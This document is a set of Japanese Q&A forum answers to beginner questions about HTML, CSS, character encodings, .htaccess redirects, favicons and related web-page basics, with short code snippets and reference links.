テーブルの幅指定のクラス名を設定すればいいだけどと思うのですが。 クラス名を指定するのが面倒と言われるとなんとも言えないですけど。
一番簡単な記述式ならこんな感じで… <style type="text/css"> table#test tr td+td { text-align:right; } </style> <table id="test"> <tr><th>No</th><th>aaaaaaa</th></tr> <tr><td>1</td><td>bbb</td></tr> <tr><td>2</td><td>ccc</td></tr> </table> より詳しい技術的な解説は、 ＞CSSだけでテーブルの列(縦方向)を一括装飾 - http://allabout.co.jp/gm/gc/440534/ 上記サイトの解説などを参考に各々の環境に最適化してください。 P.S. 何事にも最初の一歩はあるが、誰しもがゴールに到達出来るとは限らない。
ファイル……とのことですが、おそらくディレクトリ（フォルダ）のことですよね。つまり、websiteというディレクトリのなかに３つのWebページ「index.html」「contact.html」「about.html」がある。さらにwebsiteのなかにはadminというディレクトリもあって、そのなかに「admin.html」がある。こんな感じなんだと思います。 とすれば、<a href="admin/admin.html">Admin</a>と書いてみてください。《相対パス》や《絶対パス》といったキーワードで検索すると詳しいサイトが出てくるかと思いますが、<a href="Admin files/Admin1.html">Admin1</a>という書き方では、存在しないディレクトリ（Admin files）にリンクを飛ばしているためエラーになります。 それから、ファイル名が小文字のときは、リンクのファイル名も小文字にしたほうがいいですよ。 <a href="index.html">Homepage</a><br /> <a href="about.html">About</a><br /> <a href="contact.html">Contact</a><br />
Blink系ブラウザだとChromeやVivaldiだと思いますが、CSSがおかしくなるという経験はあまりありませんね。 たまにブラウザキャッシュが悪さをしているような時がありますので、スーパーリロードを使うくらいです。 http://www.benricho.org/Tips/page_reload/ おかしくなるCSSのコードのサンプルとコーディング環境を書いてみましょう。 いろんなひとが検証できますから、より適切なアドバイスに繋がると思います。
調べられた通り、電子文書のために作られたものです。ウェブサイトのための物ではありません。 HTMLもSGMLの影響を受けていますが。
＞コピペできない とりあえずリンク先ページを [ctrl+U] でHTMLソースコードをテキストとして表示させて見てください。ページ内38行目の部分に <body oncontextmenu="return false;" oncopy="return false;"> ～と記述されているかと思いますが。この oncopy="return false;" の部分がコピペ禁止を行っている部分です。 P.S. 技術的な解説をしますと、これは「JavaScriptのイベントハンドラ」を利用した即時発動型のプログラムですね。必ずしも <BODY> タグ内部に直書きしなくても良いのですが、Javascriptの知識が無いド素人でも見様見真似でサンプルコピペすれば、すぐに何某かの結果を得られるのでこの様なカーゴカルト式サイトがweb上には無数に溢れています。 この場合は oncontextmenu、oncopy～ と記述された部分がそうで。他にも onmouse とか onclick などが有り、それぞれに対応するイベントが違います。"イベント" と言うのはプログラム用語で「何かアクションが起きた（変化した）」と言う意味で、例えば「マウスがクリックされた時」とか「コピペのコマンドが実行された時」など実に様々なイベントが存在し。Javascriptを始めとしたプログラム言語のほぼ全てがそれらイベントの発生を自動的に検知して信号をプログラム側に送ります。 イベントハンドラとはそれらのイベントを感知したら自動的に指定した処理を即時実行する様に事前に仕込んで置く手法で、web上でも最も良く使われるwebページの動的処理を行う一般的な手法の1つです。 リンク先ページの例で解説しますと、 ・oncontextmenu ... 右クリックが行われた ・oncopy="return ... コピペ動作が行われた(ctrl+C) ～以上の様になっており、どちらも上記のイベントが発生した瞬間に自動的に return false; が実行される仕組みとなっています。厳密には違いますが、まあJavascriptの場合は "return false" で「何もしない（イベントを強制的に無視）」とほぼ同じ事になるので。つまりこの2つのイベントハンドラを記述して置く事により、「ページ内コピペと右クリック禁止」と言う昔懐かしい昭和のホームページ仕様を実現しています。 まあこういう勘違いサイトは未だ多いですが、文句を言っても仕様がないので。素直に自由にコピペ＆右クリック可能な他の代替サイトを探すか、[ctrl+U] でHTMLソースコードをテキスト表示させてそこから直にコピペしましょう。
はい。そうです。
5. Googlebotの指定 https://www.suzukikenichi.com/blog/7-correct-ways-of-using-robots-meta-tag/
色の異なる半円を用意して、角度を変えて重ねるという方法があります。 http://naosim.sakura.ne.jp/blog/2015/12/02/css%E3%81%A7%E5%86%86%E3%82%B0%E3%83%A9%E3%83%95%E3%82%92%E6%8F%8F%E3%81%8F/ Javascriptを使ってもいいのならさらに凝ったものが作れますね。 http://liginc.co.jp/web/js/40934
notnot さんがおっしゃるとおり、限りないコードが存在します。 特にアルファベットは１バイトで表現できますが、日本語は２バイトが必須です。 （26文字のアルファベットは１バイトで十分ですが、カナ、かな、漢字がある日本語は１バイトでは収まりません） サーバを経由してのコード変換を行うなら、UTF-8 が標準的だと思います。 ただし、端末側が日本語に対応していないと意味がありませんが・・・
両方ですね。別に珍しい事では無く、ある程度の大手サイトでは比較的見られる仕様です。 確かにタグとかで改行されてた方が見やすいですが…この様なニュースサイトはアクセス毎に動的自動的にHTMLが生成される仕様です（そうやって常に最新版の記事が反映される様になっている）。 googleのサービスともなればマイナーなものでも常に数千万から億単位のアクセスが全世界から殺到する事になりますので、例え改行1つだとしてもファイルの転送量（いわゆるパッケト）が1バイト増える事になり、その全体の合計量は1日あたり数GBにもなります。 HTMLやJavascriptなどの多くのコードは仕様上、改行の有無は関係無く動作するので、改行は純粋に人間側の都合でしか無く。本番前の作業中のHTMLは改行有りで書き、実際にweb上で運営開始する本番用のコードでは全ての改行やコメント文などを削除した軽量版をUpする事が多いです。 ファイル容量を小さくすれば、それだけパケット転送量を減らせるので運営側としてはコスト削減出来ます。User側もファイルが小さければ、閲覧時の読み込み時間が短縮されますので、より快適にweb閲覧出来る事になり…まあwiwinですね。 改行有りのHTMLやJavascriptのファイルを突っ込むと、自動的に改行やコメントなどを削除して最軽量化してくれるツールもあります。
おっしゃるようにHTMLタグではなくJavascriptのメソッドですね。 documentオブジェクトにwriteメソッドを実行することになります。 http://www.htmq.com/js/document_write.shtml HTML5では非推奨扱いになって、代わりにtextContentやinnerHTMLを使うようにと言われています。 http://web.antenna.work/innerhtml/ http://www.pori2.net/js/DOM/2.html
合っていると思いますが、さらに[OR]というフラグを使えば、RewriteRuleを一回にまとめられます。また、[NC]というフラグもつけてあげると、小文字の「abc.net」と大文字の「ABC.NET」に対応します。なお、「.」の前には「\」（←キーボードの「ろ」の部分）も必要です。 Options +SymLinksIfOwnerMatch RewriteEngine on RewriteCond %{HTTPS} off [OR] RewriteCond %{HTTP_HOST} ^abc\.net$ [NC] RewriteRule (.*) https://www.abc.net/$1 [R=301,L] 上から順に説明すると、 　・リダイレクト用に、SymLinksIfOwnerMatchを有効化（FollowSymLinksよりも、SymLinksIfOwnerMatchのほうが安全） 　・リダイレクトを有効化 　・httpでアクセスしたとき 　　　または[OR] 　・ホスト（ドメイン）名がabc.netのときは、 　・https://www.abc.net/にリダイレクト となります。 なお、レンタルサーバーによってはOptionsに非対応のところもありますので、もし500番エラーが出たらOptionsを削除してみてください。
その facebookコメントを埋め込むために自動的に生成されたコードがあると思うのですが、 その中に、「data-numposts="5"」みたいな設定値を書いてあるところに、ソート順番を指定する「data-order-by="reverse_time"」を追加しておくと、ソート順の指定も最新からの順に設定できるようです。 コメント - ソーシャルプラグイン https://developers.facebook.com/docs/plugins/comments?locale=ja_JP#sorting 「data-order-by の設定値」 social (デフォルト)：「Top」とかSNSとして注目度が高い順 time：古い順、投稿順、に相当 reverse_time：新しい順、最新、に相当 facebook data-numposts data-colorscheme data-order-by - Google 検索 https://www.google.co.jp/search?num=100&safe=off&q=facebook+data-numposts+data-colorscheme+data-order-by
HTML以外にもあるんじゃなくて、マークアップ言語とは一般的にはXMLのことを言います。 HTMLはマークアップ言語の一部、または亜流です。
RGB全ての数値を埋めないと色情報として認識されないので… .color-255 { color: #f00; } .color-255 { color: #ff0000; } .color-255 { color: rgb(255,0,0); } .color-255 { color: rgb(100%,0%,0%); } ～上記のパターンのどれかの書式に修正してください。
サーバーがHTTPヘッダで、同じ内容を返していればmetaタグ自体が不要です。 metaタグでcontent-typeを指定するなら、text/htmlは必要です。というか、それを指定するためのタグです。
そんなにプラグインには詳しくないので、御希望の動作をする既製品は知りませんが、vim 組み込み機能で C-x C-o や C-n or C-p が使えます。それに自分は neocomplcache 入れて Tab で補完するようにカスタマイズしてる程度です。 > 同様に「”」と打てば自動的に「""」と表示され > 間にカーソルがあるような感じです。 こういう単体の動作はちょっと map を工夫したり、スクリプト書けば可能ですけどね。 > 語彙や知識がないので適切なキーワードもわかりません。 直接英単語で「vim plugin complete」とか「vim neobundle completion」などと検索した方が見付けやすそうな気はします。
whoisで検索かけたらドメインの登録車情報は出てきますね。 ドメインの登録者とサイトの運営者が一緒かまでは判りませんが。 だいぶ前からドメイン名はマルチランゲージになっているので、日本語をドメイン名に使用できます。 http://キヤノン.jp/ とか存在しますよ。
文法を見る限りHTMLのソースですよね。 HTMLの一番上の記述が間違っている 参考サイト http://www.dspt.net/html_tag/001_data/017.html ソースを保存する時に、「エンコードの種類」が1番上の記述と違う。 FTPの設定で文字コードの設定が間違っている。 以上の3点になります。 FFFTPの場合、設定は殆ど触らなくて良いので、上記2点の間違いが濃厚です。 charset=EUC-JP・・・と書きながら、保存がShift-JISとか・・(その逆も)　 メモ帳をお使いでしたら、秀丸をお勧めします。
リロード →再読み込み →更新。 そうです。 なんのブラウザを使用しているかわかりませんが、アドレスの右にある、丸くなった矢印を押すことで、更新できます。 また、そこをクリックしなくても、F5で更新することが出来ます。(環境、ブラウザによって異なりますが) 健闘を祈ります。
基本的にはサイト側の問題です。
＞プログラムでサイトが生成されているのでしょうか？ はいそうです。 ＞どのプログラム言語がつかわれているのでしょうか？ Rubyみたいですね。 ちょっと古い記事ですが、おそらく今もRubyだと思います。 http://japan.cnet.com/news/ent/20353871/
ボタンとスライドショーのdivの間を詰めたいだけなら #slidemain { width:980px; height:450px; } の部分に #slidemain { width:980px; height:450px; margin-top: -7px; ←追加。数字部部分は適宜変えてください。 } と追記すれば詰まると思います。
《UTF-8》のほうが新しい規格になります。これからホームページをつくるのであれば、 <meta http-equiv="content-type" content="text/html;charset=utf-8"> のほうをおすすめします。 そのさい、最新の《HTML5》という規格を使えば、 <meta charset="UTF-8"> と書くこともできます。 ◆HTML5でマークアップしてみよう－HTML5リファレンス 　http://htmq.com/html5/003.shtml なお、《UTF-8》を使う場合は、この文字コードに対応したHTMLエディタを使うようにしてください。たとえば『StyleNote』などがあります。 ◆StyleNote | タグ挿入型 国産HTML&CSSエディター 　http://sn.lowedge.com/
昔、まだパソコンが普及する前の電算機センターでみんなで１台の大きなコンピュータを共用していたとき、それぞれのユーザーに割り当てられたフォルダ（ディレクトリ）の名前が、名前の先頭にチルダ（~）を付けたフォルダ名だったことからの名残です。
おそらくWindowsの話だと思いますが、そもそも下記のサイトに載っているように、Windows付属の和文書体（日本語フォント）はそれほど多くありません。 ◆標準の日本語フォント / もうパンツはかない 　http://rinrin.saiin.net/~aor/fonts/fonts したがって多くのサイトが、《メイリオ》《游ゴシック体》《ＭＳゴシック》のいずれかをfont-familyで指定しています。なかでも一番無難なのは、Vista以降であれば必ず入っているメイリオではないでしょうか。游ゴシック体はその美しさをWindowsでは発揮しきれず（Windowsのフォント表示は汚い）、ＭＳゴシックはXP以前の古い書体だからです。 これら以外、たとえば《創英角ポップ体》などはWindowsではなくOfficeの付属書体になります。こうした書体をfont-familyで指定しても、Officeのない環境では表示できません。文字はデフォルトのままになります。 なお、Webフォントというサービスを利用すれば、そこで提供されている書体を好きなように利用できます。Officeがあろうがなかろうが、スマホだろうがタブレットだろうが、とにかくどんな環境でも指定した書体を表示できるようになるのです。 ◆FONTPLUS｜フォントプラス 　http://webfont.fontplus.jp/ ◆Webフォント TypeSquare [タイプスクウェア] 　http://typesquare.com/ 「フォントを読み込むまで時間がかかる」「Windowsで見ると汚い」という欠点はあるものの、技術が発展し通信速度や画面解像度が向上していけば、将来的には紙の印刷物に迫る書体表現ができるのではないかと期待しています。
参考URLはGoogleですが、オフィシャルにIPアドレスの範囲は公開されていないようです。 Googlebotがどうかの確認手順も参考URLに記載されておりますが、 (1) アクセス元IPアドレスからDNSを逆引きしてドメインを取得 (2) (1)で取得したドメインをDNSから正引きをしてIPアドレスを取得 (3) アクセス元と(2)のIPアドレスが一致していて、かつ、(1)ドメインがgooglebot.com または google.comならGooglebot という手順を実施して判断可能なようです。
IE向けの条件付コメントというものです。 <!--[if IE 9 ]> ブラウザがIE9なら表示されるHTML <![endif]--> <!--[if (gt IE 9)|!(IE)]> ブラウザがIE9より大きいか、IEでなければ表示されるHTML <![endif]-->
埋め込みできるみたいですよ。 自分の投稿を表示し、右下の「．．．」を押す。 埋め込み用のHTMLコードが出てくるのでコピーしてblogなどに貼り付ければいいと思います。 Instagramのスマホアプリでも「URLのコピー」というのがありますね。 スマホアプリだとFacebookに同時投稿する選択があるから、Facebookの方を共有するという方法も可能かと思います。
身の回りの情報発信カテゴリですので 「生活・ライフスタイル」が適切なカテゴリです
Webサイトを酒精してから間もないのではないでしょうか。しばらく待ちましょう。 googleは超巨大サービスなのでサーバーが世界中におそらく数百台、もしかしたら数千台あります。そのどのにアクセスするか決まっていません。それがバラバラにクロールするので、登録してから日が浅いとサーバーごとに登録されていたりいなかったりするのです。 全国紙の新聞社のサイトなど更新頻度が高いWebサイトだと１日何度もクロールしますが、そうでないところだと数日に１回だったりもっと遅かったりします。 検索されるサーバーもあるということは、クロールされる条件は整っています。１週間も待てば全サーバーに反映されるはずです。慌てずあせらず気長に待ちましょう。
不用意に落とすのは怖いのでダウンロードしてないですが http://tempnate.com/smartphone/img/value_style_sample.jpg http://tempnate.com/smartphone/img/value_style_sample_log.jpg おっしゃられてる様に画面にロゴを使用してるかいなかだと思います
> それとも、新たに、スマホ用のホームページを作っておいて　そちらに飛ぶように、するんでしょうか？ こちらになります。 PC用と、スマホ用を別々に用意する形になります。 他のやり方としては、 レスポンシブ対応をする方法もあるかと思います。 https://syncer.jp/how-to-create-responsive-web-design
今日の日付と、誕生日の日付の差をミリ秒単位で計算。 結果を日単位に変換すればよいかと思います。 http://d.hatena.ne.jp/t_suda/20110110/1294634389
そもそもですが、ファイルのテキストエンコーディングはUTF-8になってますか? あと、どのバリデータにかけたのでしょうか? どんな検証でも同じですが、まずエラーが出ない状態を作って、どのポイントからエラーが発生するかを見極めてみてはどうでしょう。
「マークアップ」とは英語の "making-up" が鈍ったモノで、元々の意味は出版業界の専門用語で「欄外に見出し文字等の注意書きを記す事」の意味です。日本語だと校正とも言いますね。 ＞Wikipediaの解説: Proofreading#Style_guides_and_checklists - https://en.wikipedia.org/wiki/Proofreading#Style_guides_and_checklists で、そこから転じて元の文章に注釈や見出し等を書き足す行為全般を指す様になり、そこからさらに派生してコンピュータIT業界でも同じ用語使う様になり。その様な「文章や文字列を修飾したりする行為」の事を「マークアップ」と言う様になりました。 ＞HTMLで書く 厳密にはイコールではありませんが…現在の状況ではほぼイコールと考えて良いでしょう。基本的には大きなカテゴリとして「マークアップ」と言うジャンルがあって、その下にさらに「マークアップ言語」と言う小分野が有り、その中の1つがHTMLです。他にもXMLとかTeXとかSGMLなどがあります。 ＞wiki記法 元々は違いますが、webサービスで有名なwikiシステムで採用され、そこで初めて触れた人が多かったためにその名を冠して広まった「wiki記法」と呼ばれるものがあり。正式には「マークダウン記法(Markdown)」と言います。 これも前述のマークアップ言語の一種であり、現在までに様々な "方言" が開発され世界中で利用されています。自分も普段はこのマークダウン記法でほぼ全ての記事を書いています。
>メモ帳で十分でテキストエディタは要らない 何を捨てて何を得ているのかを理解されているなら、それでよいのではないでしょうか。ただ、比較の上での効率で言えば、メモ帳が非効率なのは間違いないです。非効率でも十分と思われるのなら、といったところですね。
はい、可能は可能ですが…全くの素人だと厳しいと言うか、せめて簡単な動的変化を行うページを独力で作れる程度のJavascriptの知識が必須ですね（サンプル丸コピペだと後で個々のカスタマイズ運用が出来ないので）。 リンク先のサイトはjQueryとか色々組み合わせて作られていますね。CSS3も併用されてます。まあそれなりのプロの仕事だと思います。 デザイン上の見た目はさて置き…単純に<input>などで項目を並べ、最後の[診断(=submit)]でチェックの有無を調べてそれぞれの項目の合計スコアを算出、その結果に応じて診断結果ページの内容を表示させる仕組みです。そんなに難しい処理では無いですね。
HTMLの長さ自体はそうは効きません。 img script cssなど、HTMLから他のファイルを数多く読み込んでいると、その数が多いほど遅くなります。また、画像が表示されるのが遅いのは、画像が大きいせいです。 あとは、サーバー側のプログラムでHTMLを作っている場合にそのプログラムの処理時間とか。 また、HTMLやJavaScriptがブラウザにダウンロードされてから、JavaScriptで画面を作っている場合だと、さらに遅くなります。 ケース1： 画面が表示され始めるまでが遅い場合⇒サーバープログラムでHTMLを作成しておりその処理時間が掛かっている（サーバーの能力が足りないなど） ケース２： 画面が表示され始めているが、部分的に遅い⇒多数のファイルを読み込んでいる。画像が大きい。JavaScriptで画面を作っている
ツイッターの共有ボタンは、ツイッターの公式サイトから簡単につくることができます。 下記のサイトにアクセスし、 　《リンクを共有する》をクリック 　　　↓ 　《ユーザー》と《推薦》に、質問者さんのツイッターIDを入力 　　　↓ 　《ボタンの大小》を選ぶ 　　　↓ 　右側の《<a href="">……》をすべてコピーして、質問者さんのサイトに貼りつける これでツイッターボタンが完成します。
HTMLにはHTML4.01やHTML5といったバージョンごとに使用できるタグや属性の名前、配置の仕方等のルールが定義されており、それらがHTMLでのDTD(文書型の定義)になります。 HTMLのソースの最初には必ず<!DOCTYPE ～>という記載がありますが、ここでDTD(簡単に言うとそのHTMLがどのバージョンで記述されているか)を宣言しています。 以降は宣言したDTD(利用するHTMLのバージョンのルール)に則った形で、タグ等を使ってHTMLを記述していきます。
<div>自体はタグです。 <div>xxxx</div> のように開始タグ、内容、終了タグで囲まれた全体が1つの要素です。 ソースはHTMLで記載された内容(<!DOCTYPE html> <html>～</html>まで)全体やその中の一部になります。
うんと古い話から始まることですが、いにしえのテレタイプくらいまでさかのぼると、1文字5ビットなんて体系でも実用になったんです。送れる文字種がアルファベット大文字と数字と一部記号だけだったから。 なんでここまで少なかったかと言えば、当時は通信がすんげー低速だった。75bpsとかの、今やそれ何の冗談すか？くらいな遅さ。なので極力、1文字のデータサイズを小さくする必要があったんです。 もうちょっと時代が進んで、登場したのが7ビットのASCIIコードや、8ビットのEBCDICコード（一般ではほぼ絶滅状態）です。そうこうしているうちにもっと時代が進み、非アルファベット地域でも自国言語でデータ通信をしたいと言うニーズが出てきて、各国でいろんな独自実装ができました。JISコードもその一つです。SJISはその派生です。 さらにさらに時代は下がり、国際的にデータが飛び交うようになると、各国バラバラに作ったコードでは開くのに苦労するという事態になるので（まあ当然）、国際統一規格としてUnicodeができた。これで解決…と思ったら甘くて、所詮は非アルファベット圏の人の発想だから「16ビットもあれば全世界完全カバーできるだろ」。しかし漢字だけでも数え上げると6万字以上あったようで…足りなくなって妥協せざるを得ない事態に。 また全部16ビットだとアルファベット圏では非効率である、なんてことも飛び出してきて、UTFと言う回避案が作られ…これが今の主流です。 国ごとと言うか言語ごとにいろんな事情があって、それを考慮してたらいろんなものが出来るわ、つぎはぎになっちゃったわと言うのが実際のところだったりします。種々の妥協の産物。
電話番号が無ければ書く必要は無いでしょう。 ただ、電話番号じゃなくても数字の羅列を電話番号と誤認識してリンクになってしまう場合もありますので、そうなったらタグを追記すればいいんじゃないでしょうか。
一般的には、 ・サーバーに置かれたファイルがそのまま送信されるページ⇒静的ページ ・サーバー上のプログラムでHTMLを作り出して送信するページ⇒動的ページ です。 > HTML+ JavaScriptで作られたサイトは サーバーサイドでプログラムでHTMLを生成していない限り、静的ページです。
＞PHPコード ざっと見た感じでは特に問題になる部分は見当たりません。また日を置いて改めてアクセスしたら元に戻った～と言う所から、もしかしたらこれはUser側では無く、サーバ側のキャッシュ等の不具合かも？？ CSSの問題は表示位置が画面外に飛んで見えなくなる等の致命的な症状で無い限り、とりあえずは置いておいて…。当面は様子見と言うか、特にPHPコードを一部弄っては更新して確認、一部弄っては更新して確認～を繰り返すと、サーバ側で何らかのキャッシュソフトが導入されてる場合、以前のデータが完全に上書きされずに部分的に残って変になる場合があります。 CSSがおかしくなっているのも、恐らくはそれが原因だと思います。 P.S. PHPとMySQLの運用実験を行うのなら、やはり自PC内のローカル環境下にxammp等でエミュ環境を構築して行うのが良いと思います。
HTMLのバージョンは ・1.0 ・2.0 ・3.0 ・3.2 ・4.0 ・4.01 ・5.0 ・5.1 って感じでしょうかね。 他にもXHTML 1.0 / 1.1 / 1.2 なんてのもあります。 最新版としては正式勧告されているのは 5.0 で、ドラフト版として 5.1 がリリースされています。
<p>タグはブロックレベル要素なので前後で改行されます。 画像自体を<p>タグの中に入れると改行されないと思います。
152x152ピクセルで作っておけば、問題なく表示されると思います。 いろんな端末やパソコンで使われることを想定するなら、さらに３種類（16ピクセル、32ピクセル、48ピクセル）のものを用意したほうがいいでしょう。 http://klutche.org/archives/1696/ http://websurvive.net/favicon-size/
type属性は必須ではありませんし、参考情報という扱いなので付けなくても規定上は問題ありません。
ビルドとコンパイルは、 人間に読みやすいソースコードを、 機会が理解できるマシン語に翻訳する事です。 副産物としてマシン語に変換できなかったというチェックになります。 HTMLはソースコード自体をブラウザが解釈して、 表示に反映するだけですし変換不能なものは無視するので チェックしなくてもなんとなく動くというしろものです。 エディタによってはHTMLの間違いを指摘してくれるものはあります。 デバッグというのは、バグを修正する事をいいます。
PHPによるスクレイピング（外部サイトの一部を抽出する方法）について、かなり詳細に紹介しているページをご紹介します。 http://tips.recatnap.info/simple_html_dom_parser_memo/ PHP Simple HTML DOM Parserというライブラリを使用していて、その使用方法やサンプルソースも掲載されています。 もし、こちらで技術的に難しいと感じる場合は、スクレイピング以外の方法で、自サイトに引用する方法をとった方法が、やりたいことの実現の近道かと思います。
・対応している文字コードや改行コードが少ない。 　EUC-JPや改行コードLFのテキストは編集以前にまともに開くことさえ出来ません。 ・UTF-8で保存したときトラブルの元にしかならないBOM(byte order mark)を付ける。 　BOM無しのテキストファイルを開いて上書き保存するだけでもBOMがついてしまうので 　1文字書き換えるようなちょっとした編集でもメモ帳は使えません。 　このBOMを付けるメモ帳の挙動は有名で、 　「よく分からないトラブルが起こってます。メモ帳使ってます。」なんて言うと真っ先にBOMが疑われます。 以上の理由だけで、メモ帳を使ってはいけない理由としては十分ですが、 他にも以下のよう機能が無いですね。 ・正規表現による検索、検索結果ハイライト、複数ファイルにまたがる検索 ・シンタックスハイライト、行番号表示、行ジャンプ ・自動インデント、補完入力、矩形編集 ・ウィンドウ分割、マクロ
World Wide Webに関する技術等の標準化を行うのが主な役割ですね。 HTMLやCSSなどの規格を策定しています。 詳しくはこちらをどうぞ。 https://www.w3.org/Consortium/
＞　もしかして、<img src="パス">と文字の間のソースは改行してはいけないのでしょうか？ 改行せずに <img src="パス">文字<img src=""パス"> と書けば空白は入らないでしょう。 これはHTMLの仕様に基づく正しい表示です。 日本語の環境に馴染んでいると不思議に思うかもしれませんが、英文等では単語間の区切りは空白か改行で行われるため、HTMLのソース上での改行は単語間の区切りと同じものとして扱われる事になっているので、レンダリングした画面では空白1文字に置き換えて表示されます。
え～っと、恐らく「罫線素片（けいせんそへん）」の事だと思いますので…。HTMLコードとしてページ上で実際に表示する際には… └ → └ 或いは &#x2514; ┗ → ┗ 或いは &#x2517; ～という風に記述してください。記号や数字は全て半角英数字で記述してください。この様な記述方法を「文字実体参照」と言います。 P.S. 通常のテキストファイル等で記述したい場合、文字変換(IMEなど)がONになっている状態で「けいせん」と入力し、そこから変換候補をある程度下まで探っていけば出て来ます。
Pタグで囲むか、〈br clear="all"〉では？
コーディングルールに従って使い分けるのが基本です。 自分個人のページなら自分次第です。 &nbspとスペースの決定的な違いは、 スペースは１００個並べても１つとして表現されますが、 &nbspは１００個書けば１００個分のスペースで表現されるところです。
創英角ポップ体は、MicrosoftのWordやExcelに付属してくるフォントです。そのため、これらのソフトが入っていない環境（MacやiPhone、アンドロイドなど）では、創英角ポップ体は表示できません。基本的に、Windows専用のフォントだと思ってください。 なお、『Webフォント』という技術を使えば、いろいろなフォントを使えるようになります。下記の『TypeSquare』には、（フォント一種類だけなら）無料で使えるプランがありますよ。
ルートディレクトリにそのまま置いておくだけで大丈夫だと思います。 http://www.tagindex.com/html5/page/link_webclip.html http://hapisupu.com/2015/08/iphone-android-web-clip-icon-apple-touch-icon-png/
互換モード（Quirks）というモードになるそうですよ。 http://scene-live.com/page.php?page=1 CSSが普及していなかった時代の過去のブラウザとの互換の表示するモード のようですね。 http://www.htmq.com/htmlkihon/302.shtml
「301リダイレクト」という方法を使用することで、SEO資産を新ドメインに引き継ぐことが可能です。この「301リダイレクト」は明示的に設定する必要があり、設定をせずにrefreshなどでリダイレクトをしてしまうと、SEO資産を引き継ぐことはできません。 具体的な設定方法を記載したサイトを参考URLとしてご紹介します。ごらんいただければと思います。
Java ではなく JavaScript 対応ですね。 どちらの「戻る」も JavaScript を使って戻る仕組みなので同じ事ですよね。 ただ、pageBack() は標準関数では無いので、どこかで pageBack() 関数の定義が必要になりますから、無駄に関数定義を書く必要があるってことがデメリットでしょうか。 <input type="button" value="前面に戻る" onClick="history.back()"> と書けば関数の定義を書かなくても済みますね。 あと、単純にボタンを表示させたいのであれば、input タグではなく button タグを使い <button type="button" onClick="history.back()">前面に戻る</button> と書く方がいいんじゃないでしょうか。
基本的にはサイト側の問題です。 本来なら、HTTPヘッダーやHTMLのmetaタグで文字コードを指定しなければいけませんが、抜けていたり実際に使用している文字コードと異なる文字コードを指定していてブラウザが正しく文字コードを判断できないため文字化けが起きます。 また、ページの一部に外部ファイルを読み込んだり、JavaScriptで動的に読み込んだりしている部分があって、その読み込んだデータが元々のHTMLと異なる文字コードを使用していて、複数の文字コードが混在することで文字化けを起すケースもあります。 ページ内の文字コードを統一し、正しく文字コードの宣言を書いておけば文字化けは起きません。
ページタブやブックマークに表示されるアイコンのことですね。 Faviconは『Favorite Icon』の略称で、日本語だとお気に入りアイコンと言う意味ですね。 元々はIEの機能として実装されたもので、『お気に入り』の所に表示されるアイコンと言う事でマイクロソフトがそのように命名しました。
<html> <head> </head> <body> <div> <select id="select1" size="3"> <option value="フルーツ">フルーツ</option> <option value="寿司">寿司</option> <option value="カレー">カレー</option> </select> <select id="select2" size="3"> </select> <script> var select1 = document.getElementById("select1"); var select2 = document.getElementById("select2"); select1.addEventListener("change", function(){ switch (select1.value) { case "フルーツ": select2.innerHTML = "<option>りんご</option><option>みかん</option><option>なし</option>"; break; case "寿司": select2.innerHTML = "<option>いくら</option><option>まぐろ</option><option>うに</option>"; break; case "カレー": select2.innerHTML = "<option>ビーフ</option><option>ポーク</option><option>チキン</option>"; break; } }, false); </script> </div> </body> </html>
Pタグを使用すれば、必ず1行あくというわけではないのです。 1行あくかどうかはサイトの見栄えを調整するCSS側で管理します。 もし、margin:0;というCSSがどこかに入っているのなら、それが影響して思うとおりになっていない可能性があります。 1行あく・あかないでCSSでありえそうな記述としては、margin、padding、line-heightあたりです。そういった記述がないかもあわせてご確認ください。
えーと、レンタルサーバーに画像を置いて、ebayの商品ページからimgタグなどで参照するってことですよね？ そういう用途であれば、FTPが使えるところであればライトな契約でも問題ないです。 あとは使える容量の制限があるので、それを良しとできるかどうかなのかなと思います
YouTubeの動画をWebサイト内に埋め込むというのが、一番簡単かと思います。 ◆花王 マジックリンシート　厚手15秒 CM - YouTube 　https://www.youtube.com/watch?v=SV-wFjgN_9o ためしに、上の動画を見てみてください。動画の下に、《共有》というボタンがありますね。《共有》→《埋め込みコード》→《もっと見る》と順番にクリックし、動画のサイズなどを調整します。そのうえで、上のほうにある<iframe>タグをコピーし、作成中のWebサイトに貼りつければ完成です。インラインフレーム（iframe）として、Webサイト内でYouTubeの動画が再生できるようになります。
エラーを無くしたいのであれば、そのMETAタグを入れない。 X-UA-Compatible はIE独自の拡張機能なので、標準機能からは外れたモノとなってしまいます。 HTML上で構文エラーにしたくないのであれば、WebサーバでIEの時だけヘッダーで出力するようにするのも手ですね。
そういうソースになっています。 javascriptの呼び出しが指定されていますので、他のタブやウインドウで開くことはできません。
　Googleマイビジネスというサービスですね、それ。 　自分のお店や会社などをグーグルマップ上に登録できるというものです。 　誰かがあなたを騙って登録したのかもしれません。 　Googleのサービスなので、Googleに通報した方が良いですね。 問題の報告と地図の修正 https://support.google.com/maps/answer/3094088?hl=ja
こういうときに備えて、独自ドメインも取っておいたほうが便利だと思うのですが……。 ◆初心者も上級者も満足のホームページサービス デジデジ ニュース 　http://www.digidigi.jp/homepage/news_detail.php?view_id=368 そもそも、もうデジデジにはFTP接続できないようなのですが、その点は大丈夫ですか？　もしFTP接続できるのなら、デジデジ側のドキュメントルート（index.htmlのあるディレクトリ）に、次のような《.htaccess》をアップロードしてください。「FFFTP上で.htaccessに変更」する方法でも構いません。 RewriteEngine on RewriteRule (.*) http://at.lv9.org/$1 [R=301,L] サイトの構造（ディレクトリやファイル名）を変えていないのであれば、このようなシンプルな記述でも動くかと思います。念のため、最終行に改行（[R=301,L]と入力後にEnterキー）を入れてください。それでも500番台のエラーが出る場合は、そもそもデジデジがmod_rewrite（サイトの引っ越し）に対応していないのかもしれません。 ◆WinSCP・FileZilla・FFFTPの比較：ベストなFTPソフトの選び方 　http://synclogue-navi.com/winscp-filezilla なお、サーバー（Linux）の世界では《.から始まるファイル》が隠しファイルとなっており、基本的には見えません。FFFTPのことはわかりませんが、WinSCPだと設定変更で隠しファイルも表示できますよ。
http://www.w3.org/TR/2014/REC-html5-20141028/dom.html#the-id-attribute http://www.w3.org/TR/2014/REC-html5-20141028/dom.html#classes
スルーするつもりでしたが Windows８　IE 10で問題なく表示されています。 なんとなくですが、問題のサイトがリンク切れを 実験しているようなのでそれが 災いの原因になっているのかもです。 アップデートとかやりましょうね。
なぜaというリンクタグに「a_Link」をつけるのかはわかりませんが、a_Linkとvisitedとの組み合わせは「a.a_Link:visited{}」となります。
th, td{padding:10;}
